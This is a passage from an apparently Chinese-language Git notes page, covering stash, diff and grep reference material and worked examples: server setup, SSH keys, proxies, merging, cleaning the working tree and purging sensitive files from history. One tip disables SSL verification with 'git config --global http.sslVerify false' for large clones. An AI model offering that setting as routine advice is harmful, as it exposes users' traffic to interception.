submit: 6ebd0e2... Update git-stash documentation stash@{1}: On master: 9cc0589... Add git-stash show [-u|--include-untracked|--only-untracked] [ ] [ ] : \u5c06\u5b58\u50a8\u6761\u76ee\u4e2d\u8bb0\u5f55\u7684\u66f4\u6539\u663e\u793a\u4e3a\u5b58\u50a8\u5185\u5bb9\u4e0e\u9996\u6b21\u521b\u5efa\u5b58\u50a8\u6761\u76ee\u65f6\u8fd4\u56de\u7684\u63d0\u4ea4\u4e4b\u95f4\u7684\u5dee\u5f02\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8be5\u547d\u4ee4\u663e\u793a diffstat\uff0c\u4f46\u5b83\u4f1a\u63a5\u53d7 git diff \u5df2\u77e5\u7684\u4efb\u4f55\u683c\u5f0f\uff08\u4f8b\u5982\uff0c git stash show -p stash@{1} \u4ee5\u8865\u4e01\u5f62\u5f0f\u67e5\u770b\u7b2c\u4e8c\u4e2a\u6700\u8fd1\u7684\u6761\u76ee\uff09\u3002\u5982\u679c\u6ca1\u6709 <diff-option> \u63d0\u4f9b\uff0c\u9ed8\u8ba4\u884c\u4e3a\u5c06\u7531config \u53d8\u91cf stash.showStat \u548c stash.showPatch \u7ed9\u51fa\u3002\u60a8\u4e5f\u53ef\u4ee5\u4f7f\u7528 stash.showIncludeUntracked \u8bbe\u7f6e --include-untracked \u9009\u9879\u662f\u5426\u9ed8\u8ba4\u542f\u7528\u3002 pop [--index] [-q|--quiet] [ ] : \u4ece\u5b58\u50a8\u5217\u8868\u4e2d\u5220\u9664\u5355\u4e2a\u9690\u85cf\u72b6\u6001\u5e76\u5c06\u5176\u5e94\u7528\u4e8e\u5f53\u524d\u5de5\u4f5c\u6811\u72b6\u6001\u7684\u9876\u90e8\uff0c\u5373\u6267\u884c git stash push \u7684\u9006\u64cd\u4f5c\u3002\u5de5\u4f5c\u76ee\u5f55\u5fc5\u987b\u4e0e\u7d22\u5f15\u5339\u914d\u3002\u5e94\u7528\u72b6\u6001\u53ef\u80fd\u4f1a\u56e0\u51b2\u7a81\u800c\u5931\u8d25\uff1b\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5b83\u4e0d\u4f1a\u4ece\u5b58\u50a8\u5217\u8868\u4e2d\u5220\u9664\u3002\u60a8\u9700\u8981\u624b\u52a8\u89e3\u51b3\u51b2\u7a81\uff0c\u7136\u540e\u624b\u52a8\u8c03\u7528 git stash drop \u3002 apply [--index] [-q|--quiet] [ ] : \u7c7b\u4f3cpop\uff0c\u4f46\u4e0d\u4f1a\u4ecestash\u5b58\u50a8\u5217\u8868\u4e2d\u5220\u9664\u72b6\u6001\u3002\u4e0d\u540c\u4e8epop, \u53ef\u80fd\u662f\u4efb\u4f55\u770b\u8d77\u6765\u50cf\u7531 stash push \u6216 stash create \u521b\u5efa\u7684\u63d0\u4ea4\u3002 branch [ ] : \u521b\u5efa\u5e76\u7b7e\u51fa\u4e00\u4e2a\u4ece <stash> \u6700\u521d\u521b\u5efa\u7684\u63d0\u4ea4\u5f00\u59cb\u547d\u540d\u7684\u65b0\u5206\u652f <branchname> \uff0c\u5c06 <stash> \u8bb0\u5f55\u7684\u66f4\u6539\u5e94\u7528\u5230\u65b0\u7684\u5de5\u4f5c\u6811\u548c\u7d22\u5f15\u3002\u5982\u679c\u6210\u529f\uff0c\u5e76\u4e14 <stash> \u662f\u8868\u5355\u7684\u5f15\u7528 stash@{<revision>} \uff0c\u5219\u5220\u9664 <stash> \u3002\u5982\u679c\u60a8\u8fd0\u884c git stash push \u7684\u5206\u652f\u53d1\u751f\u4e86\u8db3\u591f\u591a\u7684\u66f4\u6539\u800c\u5bfc\u81f4 git stash apply \u7531\u4e8e\u51b2\u7a81\u800c\u5931\u8d25\uff0c\u8fd9\u5c06\u5f88\u6709\u7528\u3002\u7531\u4e8e\u5b58\u50a8\u6761\u76ee\u5e94\u7528\u5728\u8fd0\u884c git stash \u65f6\u4e3a HEAD \u7684\u63d0\u4ea4\u4e4b\u4e0a\uff0c\u56e0\u6b64\u5b83\u6062\u590d\u4e86\u6700\u521d\u7684stash\u72b6\u6001\u800c\u6ca1\u6709\u51b2\u7a81\u3002 clear : \u5220\u9664\u6240\u6709stash\u6761\u76ee\u3002\u8bf7\u6ce8\u610f\uff0c\u8fd9\u4e9b\u6761\u76ee\u968f\u540e\u5c06\u53d7\u5230\u4fee\u526a\uff0c\u5e76\u4e14\u53ef\u80fd\u65e0\u6cd5\u6062\u590d\u3002 drop [-q|--quiet] [ ] : \u4ecestash\u5217\u8868\u4e2d\u5220\u9664\u5355\u4e2astash\u3002 create : \u521b\u5efa\u4e00\u4e2astash\uff08\u8fd9\u662f\u4e00\u4e2a\u5e38\u89c4\u63d0\u4ea4\u5bf9\u8c61\uff09\u5e76\u8fd4\u56de\u5176\u5bf9\u8c61\u540d\u79f0\uff0c\u800c\u4e0d\u5c06\u5176\u5b58\u50a8\u5728 ref \u547d\u540d\u7a7a\u95f4\u4e2d\u7684\u4efb\u4f55\u4f4d\u7f6e\u3002\u8fd9\u65e8\u5728\u5bf9\u811a\u672c\u6709\u7528\u3002\u5b83\u53ef\u80fd\u4e0d\u662f\u60a8\u8981\u4f7f\u7528\u7684\u547d\u4ee4\uff1b\u53c2\u89c1\u4e0a\u9762\u7684\u201cpush\u201d\u3002 store : \u5c06\u901a\u8fc7 git stash create \u521b\u5efa\u7684\u7ed9\u5b9a\u5b58\u50a8\uff08\u8fd9\u662f\u4e00\u4e2a\u60ac\u7a7a\u5408\u5e76\u63d0\u4ea4\uff09\u5b58\u50a8\u5728\u5b58\u50a8\u5f15\u7528\u4e2d\uff0c\u66f4\u65b0\u5b58\u50a8\u5f15\u7528\u65e5\u5fd7\u3002\u8fd9\u65e8\u5728\u5bf9\u811a\u672c\u6709\u7528\u3002\u5b83\u53ef\u80fd\u4e0d\u662f\u60a8\u8981\u4f7f\u7528\u7684\u547d\u4ee4\uff1b\u53c2\u89c1\u4e0a\u9762\u7684\u201cpush\u201d\u3002 \u53c2\u8003: https://git-scm.com/docs/git-stash \u6bd4\u8f83diff \uf0c1 git-diff - \u663e\u793a\u63d0\u4ea4\u3001\u63d0\u4ea4\u548c\u5de5\u4f5c\u6811\u7b49\u4e4b\u95f4\u7684\u66f4\u6539 git diff [<options>] [<commit>] [--] [<path>\u2026\u200b] git diff [<options>] --cached [--merge-base] [<commit>] [--] [<path>\u2026\u200b] git diff [<options>] [--merge-base] <commit> [<commit>\u2026\u200b] <commit> [--] [<path>\u2026\u200b] git diff [<options>] <commit>\u2026\u200b<commit> [--] [<path>\u2026\u200b] git diff [<options>] <blob> <blob> git diff [<options>] --no-index [--] <path> <path> \u53c2\u8003: https://git-scm.com/docs/git-diff \u67e5\u627egrep \uf0c1 git-grep - \u8f93\u51fa\u4e0e\u67e5\u627e\u6a21\u5f0f\u5339\u914d\u7684\u884c git grep [-a | --text] [-I] [--textconv] [-i | --ignore-case] [-w | --word-regexp] [-v | --invert-match] [-h|-H] [--full-name] [-E | --extended-regexp] [-G | --basic-regexp] [-P | --perl-regexp] [-F | --fixed-strings] [-n | --line-number] [--column] [-l | --files-with-matches] [-L | --files-without-match] [(-O | --open-files-in-pager) [<pager>]] [-z | --null] [ -o | --only-matching ] [-c | --count] [--all-match] [-q | --quiet] [--max-depth <depth>] [--[no-]recursive] [--color[=<when>] | --no-color] [--break] [--heading] [-p | --show-function] [-A <post-context>] [-B <pre-context>] [-C <context>] [-W | --function-context] [--threads <num>] [-f <file>] [-e] <pattern> [--and|--or|--not|(|)|-e <pattern>\u2026\u200b] [--recurse-submodules] [--parent-basename <basename>] [ [--[no-]exclude-standard] [--cached | --no-index | --untracked] | <tree>\u2026\u200b] [--] [<pathspec>\u2026\u200b] \u53c2\u8003: https://git-scm.com/docs/git-grep \u793a\u4f8b \uf0c1 \u4e0b\u9762\u662f\u672c\u4eba\u5b9e\u9645\u9047\u5230\u7684\u4e00\u4e9b\u793a\u4f8b: \u670d\u52a1\u5668\u642d\u5efa \uf0c1 \u672c\u5730\u81ea\u5efagit\u670d\u52a1\u5668 jerry@jerry:~$ git init --bare demo.git hint: Using 'master' as the name for the initial branch. This default branch name hint: is subject to change. To configure the initial branch name to use in all hint: of your new repositories, which will suppress this warning, call: hint: hint: git config --global init.defaultBranch <name> hint: hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and hint: 'development'. The just-created branch can be renamed via this command: hint: hint: git branch -m <name> Initialized empty Git repository in /home/jerry/demo.git/ # \u5728\u53e6\u5916\u4e00\u4e2a\u6587\u4ef6\u5939\u4e0b\u514b\u9686\u6b64\u4ed3\u5e93 jerry@jerry:~/Code$ git clone jerry@127.0.0.1:/home/jerry/demo.git Cloning into 'demo'... jerry@127.0.0.1's password: warning: You appear to have cloned an empty repository. clone\u683c\u5f0f: $ git clone ssh://gituser@www.xx.com:27852/xx/git/xx/sample.git \u5176\u4e2d gituser\uff1a\u8868\u793a\u7528\u6237 www.xx.com\uff1a\u8868\u793a\u670d\u52a1ip\u5730\u5740 27852\u8868\u793a\u7aef\u53e3 /xx/git/xx/sample.git:\u8868\u793a\u4ee3\u7801\u4ed3\u5e93\u8def\u5f84 ssh\u514d\u5bc6 \uf0c1 \u751f\u6210RSA\u5bc6\u94a5: $ ssh-keygen -t rsa -C \"1364812552@qq.com\" -t \u8868\u793a\u5bc6\u94a5\u7684\u7c7b\u578b \uff0c-b\u8868\u793a\u5bc6\u94a5\u7684\u957f\u5ea6\uff0c-C \u7528\u4e8e\u8bc6\u522b\u8fd9\u4e2a\u5bc6\u94a5\u7684\u6ce8\u91ca\u3002 linux\u9ed8\u8ba4\u751f\u6210\u76ee\u5f55\u662f ~/.ssh/ \uff0cWindows\u662f C:\\Users\\Administrator\\.ssh\\ \u590d\u5236\u516c\u94a5 id_rsa.pub \u7684\u5185\u5bb9\uff0c\u5728Github -> Settings -> SSH and GPG keys -> New SSH key \u4e2d\u6dfb\u52a0\u516c\u94a5\u3002 \u4f7f\u7528 ssh -T git@github.com \u9a8c\u8bc1\u662f\u5426\u6210\u529f\u3002 \u53ea\u514b\u9686\u5355\u4e2a\u6587\u4ef6\u5939 \uf0c1 \u4ee5https://github.com/geekhac/to...\u5b50\u76ee\u5f55\u4e3a\u4f8b\uff1a $ git init todomvc && cd todomvc $ git config core.sparsecheckout true //\u8bbe\u7f6e\u5141\u8bb8\u514b\u9686\u5b50\u76ee\u5f55 $ echo '/examples/react/*' >> .git/info/sparse-checkout //\u8bbe\u7f6e\u8981\u514b\u9686\u7684\u4ed3\u5e93\u7684\u5b50\u76ee\u5f55\u8def\u5f84 $ git remote add origin https://github.com/geekhac/to... $ git pull origin master /examples/react/* \u8def\u5f84\u53ef\u80fd\u9700\u8981\u76f8\u5bf9\u8def\u5f84\uff0c\u7ecf\u672c\u4eba\u6d4b\u8bd5\uff0c\u662f\u5426\u4ee5'/'\u5f00\u5934\u4e0d\u5f71\u54cd\u64cd\u4f5c\u7ed3\u679c\u3002 \u4ee3\u7406\u8bbe\u7f6e \uf0c1 # \u8bbe\u7f6ess $ git config --global http.proxy 'socks5://127.0.0.1:1080' $ git config --global https.proxy 'socks5://127.0.0.1:1080' # \u8bbe\u7f6e\u4ee3\u7406 $ git config --global http.proxy http://127.0.0.1:1080 $ git config --global https.proxy https://127.0.0.1:1080 # \u53d6\u6d88\u4ee3\u7406 $ git config --global --unset http.proxy $ git config --global --unset https.proxy http\u7f13\u51b2\u533a \uf0c1 \u5f53\u4ed3\u5e93\u8d85\u8fc71G\u65f6\uff0cHTTPS Clone\u548c\u4e0b\u8f7dZIP\u6587\u4ef6\u53ef\u80fd\u4f1a\u5931\u8d25\uff0c\u4f7f\u7528SSH Clone\u66f4\u597d\u3002 \u6216\u8005\u5728\u589e\u5927postBuffer\u7684\u540c\u65f6\uff0c\u5173\u95edssl\u8ba4\u8bc1\uff1a $ git config --global http.postBuffer 2048000000 # \u8bbe\u7f6e\u4e3a2G $ git config --global http.sslVerify false # \u5173\u95edsslVerify $ git config --global core.compression 0 # or -1 \u542f\u7528\u957f\u8def\u7ecf \uf0c1 git\u6709\u53ef\u4ee5\u521b\u5efa4096\u957f\u5ea6\u7684\u6587\u4ef6\u540d\uff0c\u7136\u800c\u5728windows\u6700\u591a\u662f260\uff0c\u56e0\u4e3agit\u7528\u4e86\u65e7\u7248\u672c\u7684windows api\uff0c\u4e3a\u6b64\u8e29\u4e86\u4e2a\u5751\u3002 $ git checkout -f HEAD fatal: cannot create directory at 'src/third_party/node/linux/node-linux-x64/lib/node_modules/npm/node_modules/libnpx/node_modules/yargs/node_modules/read-pkg-up/node_modules/read-pkg/node_modules/load-json-file/node_modules/parse-json/node_modules/error-ex/node_modules': Filename too long $ git config --global core.longpaths true \u5206\u652f\u5408\u5e76 \uf0c1 git merge\u6700\u7b80\u6d01\u7528\u6cd5 \u5f00\u53d1\u5206\u652f\uff08dev\uff09\u4e0a\u7684\u4ee3\u7801\u8fbe\u5230\u4e0a\u7ebf\u7684\u6807\u51c6\u540e\uff0c\u8981\u5408\u5e76\u5230 master \u5206\u652f $ git checkout dev $ git pull $ git checkout master $ git merge dev $ git push -u origin master \u5f53master\u4ee3\u7801\u6539\u52a8\u4e86\uff0c\u9700\u8981\u66f4\u65b0\u5f00\u53d1\u5206\u652f\uff08dev\uff09\u4e0a\u7684\u4ee3\u7801 $ git checkout master $ git pull $ git checkout dev $ git merge master $ git push -u origin dev \u5728\u67d0\u4e2a\u8fdc\u7a0b\u5206\u652f\u7684\u57fa\u7840\u4e0a\u521b\u5efa\u81ea\u5df1\u7684\u5206\u652f \uf0c1 $ git checkout -b \u672c\u5730\u5206\u652f\u540d origin/\u8fdc\u7a0b\u5206\u652f\u540d $ git checkout -b develop origin/develop # \u5c06\u81ea\u5df1\u521b\u5efa\u7684\u672c\u5730\u5206\u652f\u63d0\u4ea4\u5230\u8fdc\u7a0b\u5206\u652f\uff0c\u81ea\u52a8\u5728\u8fdc\u7a0b\u5206\u652f\u4e0a\u521b\u5efa\u81ea\u5df1\u7684\u5206\u652f $ git push origin \u672c\u5730\u5206\u652f\u540d:\u8fdc\u7aef\u5206\u652f\u540dxx // \u5728\u670d\u52d9\u5668\u65b0\u5efa\u65b0\u5206\u652f\u540dxxx $ git push origin develop:develop \u6253\u672c\u5730\u8865\u4e01 \uf0c1 \u53ea\u60f3\u5c06\u5f53\u524d\u6587\u4ef6\u5939\u4e2d\u6539\u52a8\u7684\u6587\u4ef6\u6253\u5305\u6210\u4e00\u4e2apatch\uff0c\u5e76\u4e0d\u60f3\u63d0\u4ea4\u76f8\u5e94\u7684\u4ee3\u7801 $ git diff > xxx.patch \u5f53\u518d\u6b21\u7528\u8fd9\u4e2apatch\u7684\u65f6\u5019\uff0c\u6267\u884c\u547d\u4ee4 $ git apply xxx.patch \u67e5\u770bcommit\u63d0\u4ea4\u8bb0\u5f55\u8be6\u60c5 \uf0c1 # \u67e5\u770b\u6700\u65b0\u7684commit $ git show # \u67e5\u770b\u6307\u5b9acommit hashID\u7684\u6240\u6709\u4fee\u6539\uff1a $ git show commitId # \u67e5\u770b\u67d0\u6b21commit\u4e2d\u5177\u4f53\u67d0\u4e2a\u6587\u4ef6\u7684\u4fee\u6539\uff1a $ git show commitId fileName \u5bf9\u63d0\u4ea4\u7684\u8865\u6551 \uf0c1 \u5f53\u6211\u4eec\u63d0\u4ea4(commit)\u540e\uff0c\u8fd8\u672apush\u524d\uff0c\u53d1\u73b0\u6709\u4e9b\u6587\u4ef6\u5fd8\u4e86\u6682\u5b58\u4e86\uff0c\u8fd9\u4e9b\u6587\u4ef6\u81ea\u7136\u4e5f\u4e0d\u53ef\u80fd\u88ab\u4e0a\u4f20\u3002\u6b64\u65f6\u9700\u8981\u8865\u6551\u63aa\u65bd\uff1a\u5373\u5c06\u8fd9\u4e9b\u6587\u4ef6add\u4e0a\uff0c\u91cd\u65b0commit\u4e00\u4e0b\u3002 \u5047\u8bbe\u6587\u4ef6forget.text\u662f\u88ab\u9057\u5fd8\u7684\u6587\u4ef6: # \u7b2c\u4e00\u6b21\u63d0\u4ea4(\u5fd8\u4e86\u6587\u4ef6) $ git commit -m \"commit-first-time\" # \u5c06\u5fd8\u4e86\u7684\u6587\u4ef6\u7ee7\u7eedadd\u4e0a $ git add forget.txt # \u91cd\u65b0\u63d0\u4ea4\u4e00\u6b21\uff0c\u8fd9\u6837\u5c31\u80fd\u591f\u5c06\u4e4b\u95f4\u6587\u4ef6\u548c\u5fd8\u4e86\u7684\u6587\u4ef6\u4e00\u8d77\u63d0\u4ea4\u4e86 $ git commit --amend \u6682\u5b58staged \uf0c1 # \u6682\u5b58\u4e00\u4e2a\u6587\u4ef6test.txt $ git add test.txt # \u53d1\u73b0\u8be5\u6587\u4ef6\u4e0d\u9700\u8981\u6682\u5b58\uff0c\u90a3\u5c31\u64a4\u9500\u5427 $ git reset HEAD test.txt # \u4e0d\u60f3\u8981\u8fd9\u4e9b\u4fee\u6539\u4e86\uff0c\u4e22\u5f03\u4fee\u6539\uff0c\u6267\u884c\u5b8c\u540e\u56de\u5230\u6700\u8fd1\u7684\u6682\u5b58\u72b6\u6001\uff0c\u5982\u679c\u6ca1\u6709\u6682\u5b58\u6587\u4ef6\uff0c\u5219\u56de\u9000\u5230\u6700\u65b0\u7684\u7248\u672c $ git checkout -- test.txt \u67e5\u770b\u5386\u53f2\u63d0\u4ea4\u8bb0\u5f55 \uf0c1 $ git log -- <file> # \u67e5\u770b\u6bcf\u6b21\u63d0\u4ea4\u7684\u5185\u5bb9\u5dee\u5f02 $ git log -p -2 -- <file> # \u53c2\u6570\uff1a-p \u8868\u793a\u6bcf\u6b21\u63d0\u4ea4\u7684\u5185\u5bb9\u5dee\u5f02\uff0c-2 \u5219\u8868\u793a\u663e\u793a\u6700\u8fd1\u7684\u4e24\u6b21\u66f4\u65b0\u3002 # \u8bf4\u660e\uff1a\u8be5\u9009\u9879\u9664\u4e86\u663e\u793a\u57fa\u672c\u4fe1\u606f\u4e4b\u5916\uff0c\u8fd8\u5728\u9644\u5e26\u4e86\u6bcf\u6b21 commit \u7684\u53d8\u5316\u3002 \u91cd\u547d\u540d\u6587\u4ef6\u6216\u6587\u4ef6\u5939 \uf0c1 $ git mv oldname newname $ git mv -f oldfolder newfolder $ git add -u newfolder (-u\u9009\u9879\u4f1a\u66f4\u65b0\u5df2\u7ecf\u8ffd\u8e2a\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939) $ git commit -m \"changed the foldername whaddup\" \u6e05\u7406\u5de5\u4f5c\u533a \uf0c1 \u53bb\u9664\u5de5\u4f5c\u533a\u7684\u4fee\u6539\uff0c\u6e05\u7a7a\u5de5\u4f5c\u76ee\u5f55\u4e2d\u65e0\u7248\u672c\u8ddf\u8e2a\u7684\u6587\u4ef6\u6216\u76ee\u5f55\u3002 \u53bb\u9664\u6682\u5b58\u533a\u7684\u6587\u4ef6\uff0c\u6807\u7eff\u7684\u6587\u4ef6\uff08git add\u7684\u6587\u4ef6\uff09,\u8fd9\u6837\u6682\u5b58\u533a\u7684\u6587\u4ef6\u4f1a\u53d8\u4e3amodify $ git reset . \u53bb\u6389modify\u7684\u6587\u4ef6\uff0c\u76f8\u5f53\u4e8e\u5168\u90e8\u5220\u9664\u81ea\u5df1\u7684\u4fee\u6539 $ git checkout . \u6709\u65f6\u5019\u56e0\u4e3a\u51b2\u7a81\u5bfc\u81f4\u5de5\u4f5c\u533a\u6709\u597d\u591auntrack\u7684\u6587\u4ef6\uff0c\u60f3\u8981\u6e05\u7a7a\u5de5\u4f5c\u533a # \u5220\u9664 untracked files $ git clean -f # \u8fde untracked \u7684\u76ee\u5f55\u4e5f\u4e00\u8d77\u5220\u6389 $ git clean -fd # \u8fde gitignore \u7684untrack \u6587\u4ef6/\u76ee\u5f55\u4e5f\u4e00\u8d77\u5220\u6389 \uff08\u614e\u7528\uff0c\u4e00\u822c\u8fd9\u4e2a\u662f\u7528\u6765\u5220\u6389\u7f16\u8bd1\u51fa\u6765\u7684 .o\u4e4b\u7c7b\u7684\u6587\u4ef6\u7528\u7684\uff09 $ git clean -xfd \u52a0\u4e0a -n \u53c2\u6570\u6765\u5148\u770b\u770b\u4f1a\u5220\u6389\u54ea\u4e9b\u6587\u4ef6\uff0c\u9632\u6b62\u91cd\u8981\u6587\u4ef6\u88ab\u8bef\u5220 \u6c38\u4e45\u5220\u9664\u6587\u4ef6\u548c\u5386\u53f2\u8bb0\u5f55 \uf0c1 \u6709\u4e9b\u65f6\u5019\u4e0d\u5c0f\u5fc3\u4e0a\u4f20\u4e86\u4e00\u4e9b\u654f\u611f\u6587\u4ef6(\u4f8b\u5982\u5bc6\u7801), \u6216\u8005\u4e0d\u60f3\u4e0a\u4f20\u7684\u6587\u4ef6\u6ca1\u53ca\u65f6\u6216\u5fd8\u4e86\u52a0\u5230.gitignore\u91cc\u7684,\u800c\u4e14\u4e0a\u4f20\u7684\u6587\u4ef6\u53c8\u7279\u522b\u5927\u7684\u65f6\u5019, \u8fd9\u5c06\u5bfc\u81f4\u522b\u4ebaclone\u4f60\u7684\u4ee3\u7801\u6216\u4e0b\u8f7dzip\u5305\u7684\u65f6\u5019\u4e5f\u5fc5\u987b\u66f4\u65b0\u6216\u4e0b\u8f7d\u8fd9\u4e9b\u65e0\u7528\u7684\u6587\u4ef6,\u56e0\u6b64, \u6211\u4eec\u9700\u8981\u4e00\u4e2a\u65b9\u6cd5, \u6c38\u4e45\u7684\u5220\u9664\u8fd9\u4e9b\u6587\u4ef6(\u5305\u62ec\u8be5\u6587\u4ef6\u7684\u5386\u53f2\u8bb0\u5f55). \u6b65\u9aa41. \u4f7f\u7528 git filter-branch \u5220\u9664\u6587\u4ef6 $ git filter-branch --force --index-filter \\ 'git rm --cached --ignore-unmatch PATH-TO-YOUR-FILE-WITH-SENSITIVE-DATA' \\ --prune-empty --tag-name-filter cat -- --all \u5176\u4e2d, PATH-TO-YOUR-FILE-WITH-SENSITIVE-DATA \u5c31\u662f\u4f60\u8981\u5220\u9664\u7684\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84(\u76f8\u5bf9\u4e8egit\u4ed3\u5e93\u7684\u6839\u76ee\u5f55), \u66ff\u6362\u6210\u4f60\u8981\u5220\u9664\u7684\u6587\u4ef6\u8def\u5f84\u5373\u53ef. \u6ce8\u610f\u4e00\u70b9\uff0c\u8fd9\u91cc\u7684\u6587\u4ef6\u6216\u6587\u4ef6\u5939\uff0c\u5982\u679c\u4ee5 '/' \u5f00\u5934\uff0c\u5219\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u4f1a\u88ab\u8ba4\u4e3a\u662f\u4ece git \u7684\u5b89\u88c5\u76ee\u5f55\u5f00\u59cb\u3002 \u5982\u679c\u4f60\u8981\u5220\u9664\u7684\u76ee\u6807\u4e0d\u662f\u6587\u4ef6\uff0c\u800c\u662f\u6587\u4ef6\u5939\uff0c\u90a3\u4e48\u8bf7\u5728 git rm --cached \u547d\u4ee4\u540e\u9762\u6dfb\u52a0 -r \u547d\u4ee4\uff0c\u8868\u793a\u9012\u5f52\u7684\u5220\u9664\uff08\u5b50\uff09\u6587\u4ef6\u5939\u548c\u6587\u4ef6\u5939\u4e0b\u7684\u6587\u4ef6\uff0c\u7c7b\u4f3c\u4e8e rm -rf \u547d\u4ee4\u3002 \u5982\u679c\u4f60\u8981\u5220\u9664\u7684\u6587\u4ef6\u5f88\u591a, \u53ef\u4ee5\u5199\u8fdb\u4e00\u4e2a .sh \u6587\u4ef6\u6279\u91cf\u6267\u884c, \u5982\u679c\u6587\u4ef6\u6216\u8def\u5f84\u91cc\u6709\u4e2d\u6587, \u7531\u4e8eMinGW\u6216CygWin\u5bf9\u4e2d\u6587\u8def\u5f84\u8bbe\u7f6e\u6bd4\u8f83\u9ebb\u70e6, \u4f60\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26 * \u53f7, \u4f8b\u5982: sound/music_*.mp3 , \u8fd9\u6837\u5c31\u628asound\u76ee\u5f55\u4e0b\u4ee5 music_ \u5f00\u5934\u7684mp3\u6587\u4ef6\u90fd\u5220\u9664\u4e86. \u4f8b\u5982:\u65b0\u5efa\u4e00\u4e2a bash \u811a\u672c\u6587\u4ef6\uff0c del-music-mp3.sh : #!/bin/bash git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch projects/Moon.mp3' --prune-empty --tag-name-filter cat -- --all git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch sound/Music_*.mp3' --prune-empty --tag-name-filter cat -- --all \u5982\u679c\u4f60\u770b\u5230\u7c7b\u4f3c\u4e0b\u9762\u8fd9\u6837\u7684, \u5c31\u8bf4\u660e\u5220\u9664\u6210\u529f\u4e86: Rewrite 48dc599c80e20527ed902928085e7861e6b3cbe6 (266/266) # Ref 'refs/heads/master' was rewritten \u5982\u679c\u663e\u793a xxxxx unchanged , \u8bf4\u660erepo\u91cc\u6ca1\u6709\u627e\u5230\u8be5\u6587\u4ef6, \u8bf7\u68c0\u67e5\u8def\u5f84\u548c\u6587\u4ef6\u540d\u662f\u5426\u6b63\u786e. \u5982\u679c\u4f60\u60f3\u4ee5\u540e\u4e5f\u4e0d\u4f1a\u518d\u4e0a\u4f20\u8fd9\u4e2a\u6587\u4ef6\u6216\u6587\u4ef6\u5939, \u8bf7\u628a\u8fd9\u4e2a\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u6dfb\u52a0\u5230 .gitignore \u6587\u4ef6\u91cc, \u7136\u540e\u518dpush\u4f60\u7684repo. \u6b65\u9aa42. \u63a8\u9001\u4fee\u6539\u540e\u7684repo \u4ee5\u5f3a\u5236\u8986\u76d6\u7684\u65b9\u5f0f\u63a8\u9001\u4f60\u7684repo, \u547d\u4ee4\u5982\u4e0b: $ git push origin master --force --all Counting objects: 4669, done. Delta compression using up to 4 threads. Compressing objects: 100% (4352/4352), done. Writing objects: 100% (4666/4666), 35.16 MiB | 51 KiB/s, done. Total 4666 (delta 1361), reused 0 (delta 0) To https://github.com/defunkt/github-gem.git + beb839d...81f21f3 master -> master (forced update) \u8fd9\u4e2a\u8fc7\u7a0b\u5176\u5b9e\u662f\u91cd\u65b0\u4e0a\u4f20\u6211\u4eec\u7684repo, \u6bd4\u8f83\u8017\u65f6, \u867d\u7136\u8ddf\u5220\u6389\u91cd\u65b0\u5efa\u4e00\u4e2arepo\u6709\u4e9b\u7c7b\u4f3c, \u4f46\u662f\u597d\u5904\u662f\u4fdd\u7559\u4e86\u539f\u6709\u7684\u66f4\u65b0\u8bb0\u5f55, \u6240\u4ee5\u8fd8\u662f\u6709\u4e9b\u4e0d\u540c\u7684. \u5982\u679c\u4f60\u5b9e\u5728\u4e0d\u5728\u610f\u8fd9\u4e9b\u66f4\u65b0\u8bb0\u5f55, \u4e5f\u53ef\u4ee5\u5220\u6389\u91cd\u5efa, \u4e24\u8005\u4e5f\u5dee\u4e0d\u592a\u591a, \u4e5f\u8bb8\u540e\u8005\u8fd8\u66f4\u76f4\u89c2\u4e9b. \u4e3a\u4e86\u80fd\u4ece\u6253\u4e86 tag \u7684\u7248\u672c\u4e2d\u4e5f\u5220\u9664\u4f60\u6240\u6307\u5b9a\u7684\u6587\u4ef6\u6216\u6587\u4ef6\u5939\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u8fd9\u6837\u7684\u547d\u4ee4\u6765\u5f3a\u5236\u63a8\u9001\u60a8\u7684 Git tags\uff1a $ git push origin master --force --tags \u544a\u8bc9\u60a8\u7684\u534f\u4f5c\u8005\uff0c\u4ece\u60a8\u7684\u65e7(\u53d7\u6c61\u67d3\u7684)\u5b58\u50a8\u5e93\u5386\u53f2\u4e2d\u91cd\u65b0\u521b\u5efa\u5206\u652f\uff0c\u800c\u4e0d\u662f\u5408\u5e76\u5b83\u4eec\u3002\u4e00\u4e2a\u5408\u5e76\u63d0\u4ea4\u53ef\u80fd\u4f1a\u91cd\u65b0\u5f15\u5165\u4e00\u4e9b\u6216\u6240\u6709\u60a8\u521a\u521a\u9677\u5165\u6e05\u9664\u9ebb\u70e6\u7684\u53d7\u6c61\u67d3\u7684\u5386\u53f2\u3002 \u6b65\u9aa43. \u6e05\u7406\u548c\u56de\u6536\u7a7a\u95f4 \u7ecf\u8fc7\u4e00\u6bb5\u65f6\u95f4\u4e4b\u540e\uff0c\u60a8\u786e\u4fe1 git filter-branch \u6ca1\u6709\u610f\u5916\u7684\u526f\u4f5c\u7528\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5f3a\u5236\u89e3\u9664\u5bf9\u672c\u5730\u5b58\u50a8\u5e93\u4e2d\u7684\u6240\u6709\u5bf9\u8c61\u7684\u5f15\u7528\u548c\u5783\u573e\u56de\u6536(GC)\u3002 $ git for-each-ref --format='delete %(refname)' refs/original | git update-ref --stdin $ git reflog expire --expire=now --all $ git gc --prune=now Counting objects: 2437, done. Delta compression using up to 4 threads. Compressing objects: 100% (1378/1378), done. Writing objects: 100% (2437/2437), done. Total 2437 (delta 1461), reused 1802 (delta 1048) $ git gc --aggressive --prune=now Counting objects: 2437, done. Delta compression using up to 4 threads. Compressing objects: 100% (2426/2426), done. Writing objects: 100% (2437/2437), done. Total 2437 (delta 1483), reused 0 (delta 0) 